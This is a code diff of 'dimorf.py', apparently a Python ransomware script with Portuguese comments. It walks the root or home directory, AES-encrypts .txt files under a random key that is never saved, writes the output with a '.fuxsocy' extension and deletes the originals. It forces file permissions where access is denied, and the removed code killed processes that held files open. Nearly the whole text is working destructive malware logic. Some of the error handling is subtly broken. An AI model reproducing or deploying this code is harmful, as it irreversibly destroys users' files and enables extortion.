@@ -7,39 +7,66 @@ __maintainer__ = 'Wendel Ortiz'
 __credits__ = ['Contributors']
 __module__ = 'dimorf.py'
 
-import psutil
 import sys
 import os
 from Crypto.Cipher import AES
 from Crypto import Random
 
 
+USER_DIR = os.getenv('HOME')
+ROOT_PATH = '/root'
+
+
 def check_os(osname: str) -> str | None:
-    if_linux = [
+    is_linux = [
         prop for prop in os.uname() if (
             (prop == "Linux")
-        ) and (
-            (sys.platform == "linux")
-        ) and (
+        ) and ((sys.platform == "linux")) and (
             (os.name == osname)
         )
     ]
 
-    if (if_linux):
-        if (sys.version[0] == '3'):
-            main(USER_DIR=os.getenv('HOME'),
-                 ROOT_PATH="/root")
+    try:
+        if (is_linux):
+            if (sys.version[0] == '3'):
+                if (os.getuid() == 0):
+                    find_and_encrypt(
+                        path=ROOT_PATH,
+                        ext_files=['.txt'],
+                        hidden='.',
+                        new_ext='.fuxsocy',
+                        key=Random.get_random_bytes(32),
+                        block_bytes=65536
+                    )
+
+                else:
+                    find_and_encrypt(
+                        path=USER_DIR,
+                        ext_files=['.txt'],
+                        hidden='.',
+                        new_ext='.fuxsocy',
+                        key=Random.get_random_bytes(32),
+                        block_bytes=65536
+                    )
+
+            else:
+                sys.exit('\33[31mPython3 é requerido.\33[0m')
+
+        else:
+            sys.exit('\33[31mSistema Operacional não suportado.\33[0m')
+
+    except OSError:
+        pass
 
 
 def find_and_encrypt(
     path: str,
     ext_files: list,
     hidden: str,
-    tmp_ext: str,
-    new_ext: list,
+    new_ext: str,
     key: bytes,
     block_bytes: int
-) -> str | None:
+) -> str | bytes | list | None:
 
     for root, dirs, files in os.walk(path):
         for file in files:
@@ -56,59 +83,73 @@ def find_and_encrypt(
                     hidden
                 )
             )):
-
+                # # verificando permissão
                 if (
-                    os.access(
+                        os.access(
+                            os.path.join(
+                                root,
+                                file
+                            ), os.F_OK
+                        ) and (
+                            os.access(
+                                os.path.join(
+                                    root,
+                                    file
+                                ), os.W_OK
+                            )
+                        ) and (
+                            os.access(
+                                os.path.join(
+                                    root,
+                                    file
+                                ), os.R_OK
+                            )
+                        )):
+
+                    # # iniciando operacoes criptograficas.
+                    init_vector = Random.new().read(32)
+                    cipher = AES.new(
+                        key,
+                        AES.MODE_EAX,
+                        init_vector
+                    )
+
+                    with open(os.path.join(root, file), mode='rb') as f:
+                        data = f.read(
+                            block_bytes
+                        )
+
+                    with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
+                        f.write(
+                            cipher.encrypt(
+                                data
+                            )
+                        )
+
+                    os.remove(
                         os.path.join(
                             root,
                             file
-                        ), os.F_OK
-                    ) and (
-                        os.access(
-                            os.path.join(
-                                root,
-                                file
-                            ), os.W_OK
-                        )
-                    ) and (
-                        os.access(
-                            os.path.join(
-                                root,
-                                file
-                            ), os.R_OK
                         )
                     )
-                ):
-                    
+
+                else:
                     if (
-                        os.rename(
+                        os.chmod(
                             os.path.join(
                                 root,
                                 file
-                            ),
-                            os.path.join(
-                                root,
-                                f'{file}{tmp_ext}'
-                            )
+                            ), 0o644
                         )
                     ):
 
-                        # # iniciando processo.
-                        init_vector = Random.new().read(32)
-                        cipher = AES.new(
-                            key,
-                            AES.MODE_EAX,
-                            init_vector
-                        )
-
                         try:
-                            
-                            with open(os.path.join(root, file), 'rb') as f:
+                            with open(os.path.join(root, file), mode='rb') as f:
                                 data = f.read(
                                     block_bytes
                                 )
 
-                            with open(os.path.join(root, file), 'wb') as f:
+                            with open(f'{os.path.join(root, file)}{new_ext}', mode='wb') as f:
                                 f.write(
                                     cipher.encrypt(
                                         data
@@ -122,135 +163,28 @@ def find_and_encrypt(
                                 )
                             )
 
-                        except KeyboardInterrupt:
-                            sys.exit('Encerrado.')
-
-                    else:
-                        for proc in psutil.process_iter():
-                            for file in proc.open_files():
-                                if ((file.path) == (
+                        except Exception:
+                            if (
+                                not os.chmod(
                                     os.path.join(
                                         root,
                                         file
-                                    )
-                                ) and (
-                                    proc.username() == (os.getenv(
-                                        'USER'
-                                    ))
-                                )):
-                                    
-                                    try:
-                                        
-                                        proc.kill(
-                                            proc.pid
-                                        )
-                                        
-                                    except psutil.AccessDenied as e:
-                                        raise (
-                                            'Operação não permitida.'
-                                        ) from e
-
-                                    else:
-                                        
-                                        os.rename(
-                                            os.path.join(
-                                                root,
-                                                file
-                                            ),
-                                            os.path.join(
-                                                root,
-                                                f'{file}{tmp_ext}'
-                                            )
-                                        )
-
-                                        with open(os.path.join(root, file), 'rb') as f:
-                                            data = f.read(
-                                                block_bytes
-                                            )
-
-                                        with open(os.path.join(root, file), 'wb') as f:
-                                            f.write(
-                                                cipher.encrypt(
-                                                    data
-                                                )
-                                            )
-
-                                        os.remove(
-                                            os.path.join(
-                                                root,
-                                                file
-                                            )
-                                        )
-
-                else:
-                    if (os.chmod(
-                        os.path.join(
-                            root,
-                            file
-                        ), 0o644
-                    )):
-                        
-                        with open(os.path.join(root, file), 'rb') as f:
-                            data = f.read(
-                                block_bytes
-                            )
-
-                        with open(os.path.join(root, file), 'wb') as f:
-                            f.write(
-                                cipher.encrypt(
-                                    data
+                                    ), 0o644
                                 )
-                            )
+                            ):
 
-                        os.remove(
-                            os.path.join(
-                                root,
-                                file
-                            )
-                        )
-                        
+                                logs = [
+                                    ('Erro ao alterar permissões de arquivo.\n'),
+                                    (f'Arquivos => {os.path.join(root, file)}\n')
+                                ]
+
+                                with open('log_dimorf.log', mode='w') as lf:
+                                    lf.write(
+                                        logs
+                                    )
+
             else:
-                sys.exit('Nenhum arquivo encontrado.')
-
-
-def main(USER_DIR: str, ROOT_PATH: str) -> str | None:
-    if os.getuid() == 0:
-        if (
-            not os.getenv(
-                "ROOT_PATH"
-            )
-        ):
-
-            if (
-                os.system(
-                    f'export ROOT_PATH="{ROOT_PATH}"'
-                )
-            ):
-                
-                USER_DIR = os.getenv(
-                    "ROOT_PATH"
-                )
-                
-                find_and_encrypt(
-                    path=USER_DIR,
-                    ext_files=['.txt'],
-                    hidden='.',
-                    tmp_ext='.tmp',
-                    new_ext='.fuxsocy',
-                    key=Random.get_random_bytes(32),
-                    block_bytes=65536
-                )
-
-    else:
-        find_and_encrypt(
-            path=USER_DIR,
-            ext_files=['.txt'],
-            hidden='.',
-            tmp_ext='.tmp',
-            new_ext='.fuxsocy',
-            key=Random.get_random_bytes(32),
-            block_bytes=65536
-        )
+                sys.exit('\33[31mNenhum arquivo encontrado.\33[0m')
 
 
 if __name__ == '__main__':
